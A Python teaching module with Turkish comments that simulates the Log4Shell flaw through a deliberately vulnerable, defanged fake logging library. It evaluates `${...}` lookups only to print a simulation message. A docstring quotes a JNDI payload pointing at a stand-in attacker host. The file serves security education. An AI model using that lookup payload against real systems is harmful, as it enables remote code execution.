# DEFANGED SIMULATION — no real malicious behavior, for educational demonstration only
"""
vulnerable_logger — Modül 03 / Senaryo 1 için yazılmış SAHTE bir üçüncü taraf
"logging kütüphanesi". Log4j 2.x'teki Log4Shell (CVE-2021-44228) zafiyetini temsil eder:
kütüphane, kendisine verilen log mesajını "zenginleştirmek" için mesaj içindeki
`${...}` biçimindeki ifadeleri AYRIŞTIRIP DEĞERLENDİRİR (message lookup substitution).

Gerçek Log4Shell'de bu değerlendirme JNDI üzerinden uzak sunucudan sınıf yükleyip
Remote Code Execution'a yol açıyordu. Burada hiçbir gerçek kod çalıştırılmaz —
zafiyetin MEKANİZMASI (girdiyi veri değil, kod/ifade olarak yorumlama) gösterilir,
etkisi ise DEFANGED bir metinle simüle edilir.

Bu, uygulamanın kendi kodunun değil, GÜVENDİĞİ BİR BAĞIMLILIĞIN zafiyetli olması
durumudur (A03:2025 — Software Supply Chain Failures). Uygulama girdiyi "sadece
logluyorum" niyetiyle geçirir; kusur kütüphanenin içindedir.
"""
import re

__version__ = "1.0.0-vulnerable"

# `${...}` içindeki ifadeyi yakalar (Log4j lookup söz dizimini taklit eder).
_LOOKUP_PATTERN = re.compile(r"\$\{([^}]*)\}")


def _evaluate_lookup(expression: str) -> str:
    """
    ZAFIYETİN KALBİ (DEFANGED): Gerçek Log4Shell burada `expression`'ı yorumlar;
    örn. `jndi:ldap://attacker/a` görürse uzak sınıf yükler ve RCE olur.

    Burada HİÇBİR şey çalıştırmıyoruz. Sadece bu noktada gerçekte ne olacağını
    açıklayan bir simülasyon metni döndürüyoruz — böylece "girdinin veri değil,
    yürütülecek bir ifade olarak ele alınması"nın neden yıkıcı olduğu görülür.
    """
    return f"[SİMÜLASYON] Burada RCE tetiklenirdi: lookup '${{{expression}}}' değerlendirilip uzak kod çalıştırılırdı"


def log(message: str) -> str:
    """
    ZAFIYET: Kütüphane, log mesajını düz veri olarak ele almak yerine içindeki
    `${...}` ifadelerini arayıp `_evaluate_lookup` ile "değerlendirir". Kullanıcı
    kontrollü bir string log'lanınca saldırganın ifadesi yürütme yoluna girer.
    """
    def _replace(match: re.Match) -> str:
        return _evaluate_lookup(match.group(1))

    rendered = _LOOKUP_PATTERN.sub(_replace, message)
    line = f"INFO: {rendered}"
    print(line)  # gerçek bir logger gibi stdout'a da yazar
    return line
